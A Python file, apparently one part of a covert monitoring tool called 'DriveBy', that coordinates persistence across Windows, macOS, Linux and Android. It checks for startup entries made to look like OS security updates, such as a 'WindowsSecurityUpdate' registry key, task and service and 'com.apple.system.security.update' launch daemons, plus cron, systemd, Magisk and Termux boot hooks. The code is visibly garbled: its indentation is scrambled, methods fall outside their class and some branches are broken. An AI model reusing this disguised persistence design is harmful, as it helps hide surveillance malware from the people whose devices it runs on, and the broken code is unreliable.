#!/usr/bin/env python3
"""
DriveBy Persistence System
Ensures monitoring processes restart after shutdown/restart across all platforms
"""

import os
import sys
import platform
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

class PersistenceCoordinator:
    def __init__(self):
        self.os_type = self.detect_os()
        self.persistence_handler = self.get_persistence_handler()

    def detect_os(self):
        """Detect the operating system"""
        system = platform.system().lower()

        if system == "windows":
            return "windows"
        elif system == "darwin":
            return "macos"
        elif system == "linux":
            # Check if it's Android
            if self.is_android():
                return "android"
            else:
                return "linux"
            else:
                return "unknown"

def is_android(self):
    """Check if running on Android"""
    android_indicators = [
    "/system/build.prop",
    "/data/data",
    "/system/app",
    "/android_root"
    ]

    for indicator in android_indicators:
        if os.path.exists(indicator):
            return True

            # Check for Android-specific environment variables
            android_env_vars = ["ANDROID_DATA", "ANDROID_ROOT", "ANDROID_STORAGE"]
            for var in android_env_vars:
                if os.environ.get(var):
                    return True

                    return False

def get_persistence_handler(self):
    """Get the appropriate persistence handler for the OS"""
    try:
        if self.os_type == "windows":
            from .windows_persistence import WindowsPersistence
            return WindowsPersistence()
        elif self.os_type == "macos":
            from .macos_persistence import MacOSPersistence
            return MacOSPersistence()
        elif self.os_type == "linux":
            from .linux_persistence import LinuxPersistence
            return LinuxPersistence()
        elif self.os_type == "android":
            from .android_persistence import AndroidPersistence
            return AndroidPersistence()
        else:
            print(f" Unsupported OS: {self.os_type}")
            return None
    except ImportError as e:
            print(f" Failed to import persistence handler: {e}")
            return None

def install_persistence(self):
    """Install persistence mechanisms for the current OS"""
    if not self.persistence_handler:
        print(" No persistence handler available")
        return False

        print(f" Installing persistence for {self.os_type.upper()}...")

        try:
            result = self.persistence_handler.install_all_persistence()

            if result:
                print(f" Persistence successfully installed for {self.os_type.upper()}")
                print(" Monitoring processes will now restart automatically after reboot")
            else:
                print(f" Failed to install persistence for {self.os_type.upper()}")

                return result

        except Exception as e:
                print(f" Error installing persistence: {e}")
                return False

def remove_persistence(self):
    """Remove persistence mechanisms for the current OS"""
    if not self.persistence_handler:
        print(" No persistence handler available")
        return False

        print(f" Removing persistence for {self.os_type.upper()}...")

        try:
            result = self.persistence_handler.remove_persistence()

            if result:
                print(f" Persistence successfully removed for {self.os_type.upper()}")
            else:
                print(f" Failed to remove persistence for {self.os_type.upper()}")

                return result

        except Exception as e:
                print(f" Error removing persistence: {e}")
                return False

def check_persistence_status(self):
    """Check if persistence is currently active"""
    print(f" Persistence Status for {self.os_type.upper()}:")
    print("=" * 40)

    if self.os_type == "windows":
        self._check_windows_persistence()
    elif self.os_type == "macos":
        self._check_macos_persistence()
    elif self.os_type == "linux":
        self._check_linux_persistence()
    elif self.os_type == "android":
        self._check_android_persistence()

def _check_windows_persistence(self):
    """Check Windows persistence status"""
    import winreg
    import subprocess

    checks = []

    # Check registry
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run") as key:
        try:
            winreg.QueryValueEx(key, "WindowsSecurityUpdate")
            checks.append(" Registry persistence: Active")
        except FileNotFoundError:
            checks.append(" Registry persistence: Not found")
        except:
            checks.append(" Registry persistence: Error checking")

            # Check scheduled task
            result = subprocess.run(['schtasks', '/query', '/tn', 'WindowsSecurityUpdate'],
            capture_output=True)
            if result.returncode == 0:
                checks.append(" Scheduled task: Active")
            else:
                checks.append(" Scheduled task: Not found")

                # Check service
                result = subprocess.run(['sc', 'query', 'WindowsSecurityService'],
                capture_output=True)
                if result.returncode == 0:
                    checks.append(" Windows service: Active")
                else:
                    checks.append(" Windows service: Not found")

                    for check in checks:
                        print(check)

def _check_macos_persistence(self):
    """Check macOS persistence status"""
    import subprocess

    checks = []

    # Check LaunchDaemon
    daemon_plist = "/Library/LaunchDaemons/com.apple.system.security.update.plist"
    if os.path.exists(daemon_plist):
        checks.append(" LaunchDaemon: Active")
    else:
        checks.append(" LaunchDaemon: Not found")

        # Check LaunchAgent
        agent_plist = Path.home() / "Library/LaunchAgents/com.apple.system.security.update.agent.plist"
        if agent_plist.exists():
            checks.append(" LaunchAgent: Active")
        else:
            checks.append(" LaunchAgent: Not found")

            # Check Login Items
            try:
                result = subprocess.run(['osascript', '-e',
                'tell application "System Events" to get name of login items'],
                capture_output=True, text=True)
                if "SystemSecurityUpdate" in result.stdout:
                    checks.append(" Login Items: Active")
                else:
                    checks.append(" Login Items: Not found")
            except:
                    checks.append(" Login Items: Error checking")

                    for check in checks:
                        print(check)

def _check_linux_persistence(self):
    """Check Linux persistence status"""
    import subprocess

    checks = []

    # Check systemd service
    try:
        result = subprocess.run(['systemctl', 'is-enabled', 'system-security-update'],
        capture_output=True, text=True)
        if result.returncode == 0 and "enabled" in result.stdout:
            checks.append(" Systemd service: Active")
        else:
            checks.append(" Systemd service: Not found")
    except:
            checks.append(" Systemd service: Error checking")

            # Check init.d service
            if os.path.exists("/etc/init.d/system-security-update"):
                checks.append(" Init.d service: Active")
            else:
                checks.append(" Init.d service: Not found")

                # Check cron
                try:
                    result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                    if "system_security_wrapper" in result.stdout:
                        checks.append(" Cron job: Active")
                    else:
                        checks.append(" Cron job: Not found")
                except:
                        checks.append(" Cron job: Error checking")

                        for check in checks:
                            print(check)

def _check_android_persistence(self):
    """Check Android persistence status"""
    checks = []

    # Check init.d
    if os.path.exists("/system/etc/init.d/99security"):
        checks.append(" Init.d script: Active")
    else:
        checks.append(" Init.d script: Not found")

        # Check Magisk module
        if os.path.exists("/data/adb/modules/system_security"):
            checks.append(" Magisk module: Active")
        else:
            checks.append(" Magisk module: Not found")

            # Check Termux boot
            boot_file = Path.home() / ".termux/boot/security_service"
            if boot_file.exists():
                checks.append(" Termux boot: Active")
            else:
                checks.append(" Termux boot: Not found")

                for check in checks:
                    print(check)

def install_persistence():
    """Install persistence for the current platform"""
    coordinator = PersistenceCoordinator()
    return coordinator.install_persistence()

def remove_persistence():
    """Remove persistence for the current platform"""
    coordinator = PersistenceCoordinator()
    return coordinator.remove_persistence()

def check_persistence_status():
    """Check persistence status for the current platform"""
    coordinator = PersistenceCoordinator()
    coordinator.check_persistence_status()

    if __name__ == "__main__":
        import argparse

        parser = argparse.ArgumentParser(description="DriveBy Persistence Manager")
        parser.add_argument("action", choices=["install", "remove", "status"],
        help="Action to perform")

        args = parser.parse_args()

        coordinator = PersistenceCoordinator()

        print(" DriveBy Persistence Manager")
        print("=" * 40)
        print(f"Detected OS: {coordinator.os_type.upper()}")
        print("=" * 40)

        if args.action == "install":
            coordinator.install_persistence()
        elif args.action == "remove":
            coordinator.remove_persistence()
        elif args.action == "status":
            coordinator.check_persistence_status()
